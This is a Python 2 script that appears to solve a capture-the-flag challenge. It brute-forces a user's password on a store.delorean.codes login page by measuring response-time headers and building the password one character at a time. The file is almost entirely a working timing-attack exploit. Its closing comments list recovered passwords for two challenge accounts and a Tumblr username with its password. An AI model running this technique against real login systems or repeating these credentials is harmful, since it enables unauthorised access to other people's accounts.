import urllib
import urllib2

def getHeader(password):
    url = 'https://store.delorean.codes/u/marilynzhang/login'
    values = {'username' : 'marty_mcfly',
              'password' : password}

    data = urllib.urlencode(values)
    req = urllib2.Request(url, data)
    response = urllib2.urlopen(req)
    the_page = response.read

    return (float(getTime(response.info().headers[5])), password)

def getTime(header):
    result = header[26:]
    result = result[:-2]
    return result

lcase = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r'
,'s','t','u','v','w','x','y','z']
ucase = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R'
,'S','T','U','V','W','X','Y','Z']
nums = ['0','1','2','3','4','5','6','7','8','9']
pw = lcase + ucase + nums

string = ""
maximum = 0.01
char = ""
for i in range(1, 12):
    for element in pw:
        t = (getHeader(string + element))
        if t[0] == 0.01 and i > 1:
            password = t[1]
            print password
            break
        elif t[0] > maximum:
            maximum = t[0]
            char = t[1][i-1]
            string += char
            break

#tumblr username: dangerouslydeepeststudentus  password: ReW3mmHS60


#marty_mcfly's password: ReW3mmHS60  tG6NCPMFZI
#biff_tannen's password: FF2f9d2Qyu  wIBhlipPdU
